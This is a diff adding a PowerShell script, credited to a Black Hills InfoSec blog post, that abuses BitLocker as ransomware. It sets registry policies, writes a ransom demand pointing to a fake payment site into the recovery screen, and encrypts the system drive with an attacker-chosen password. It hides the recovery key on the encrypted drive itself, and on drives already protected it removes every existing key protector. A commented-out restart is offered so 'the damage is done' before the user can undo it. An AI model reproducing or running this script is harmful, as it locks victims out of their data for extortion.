@@ -1,0 +1,100 @@
+#https://www.blackhillsinfosec.com/bitlocker-ransomware-using-bitlocker-for-nefarious-reasons/
+
+#BitLocker for Ransom
+
+#Is BitLocker already enabled on the system drive
+
+$Check = (get-BitLockervolume -mountpoint $ENV:SystemDrive)
+
+$Status = $Check.ProtectionStatus
+
+if($Status -eq 'Off'){echo 'BitLocker NOT Enabled on System Drive'}
+
+if($Status -eq 'On'){echo 'BitLocker IS Enabled on System Drive'}
+
+#Set registry first
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v EnableBDEWithNoTPM 
+/t REG_DWORD /d 1 /f
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseAdvancedStartup 
+/t REG_DWORD /d 1 /f
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPM /t REG_DWORD 
+/d 2 /f
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKey /t 
+REG_DWORD /d 2 /f
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKeyPIN /t 
+REG_DWORD /d 2 /f
+
+#Change the recovery message to meet your needs. In my example I 
+put a fake website where the victim can come and pay for their 
+password
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage 
+/t REG_SZ /d 'please Visit my hacker site https://yourscrewed.hahaha 
+to give me money' /f
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /V 
+RecoveryKeyMessageSource /t REG_DWORD /d 2 /f
+
+REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMPIN /t 
+REG_DWORD /d 2 /f
+
+#Use a Strong Password Here!
+
+$PlainPassword = "P@ssw0rd"
+
+$SecurePassword = $PlainPassword | ConvertTo-SecureString 
+-AsPlainText -Force
+
+if($Status -eq 'Off'){
+
+#Enable BitLocker, Encrypt the used space on the C: drive
+
+enable-BitLocker -EncryptionMethod Aes256 -password $securepassword 
+-mountpoint $ENV:SystemDrive  -PasswordProtector -skiphardwaretest 
+-UsedSpaceOnly
+
+#To use the Custom Recovery Screen, there must be a recovery key 
+created. I dont want to use the recovery key, so I put it on the 
+encrypted C: drive so it is inaccessible.
+
+add-BitLockerkeyprotector -mountpoint $ENV:SystemDrive 
+-RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\
+
+#Uncomment to restart the Computer ASAP so that the damage is done 
+before the user can undo it. I dont do this by default
+
+#restart-computer
+
+}
+
+#If BitLocker is already enabled on the systemd drive. The following 
+will execute, removing all passwords and recovery keys. Then adding 
+my own passwords and keys just like before.
+
+if ($Status -eq 'On'){
+
+#Strip all Passwords and Recovery keys (Not yet Tested with TPM)
+
+$IDS = $check.KeyProtector.KeyProtectorID
+
+foreach($ID in $IDS){
+
+Remove-BitLockerKeyProtector -Mountpoint $ENV:SystemDrive 
+-KeyProtectorID $ID
+
+}
+
+add-BitLockerkeyprotector -mountpoint $ENV:SystemDrive 
+-PasswordProtector -Password $securepassword
+
+add-BitLockerkeyprotector -mountpoint $ENV:SystemDrive 
+-RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\
+
+Resume-BitLocker -MountPoint $ENV:SystemDrive
+
+}
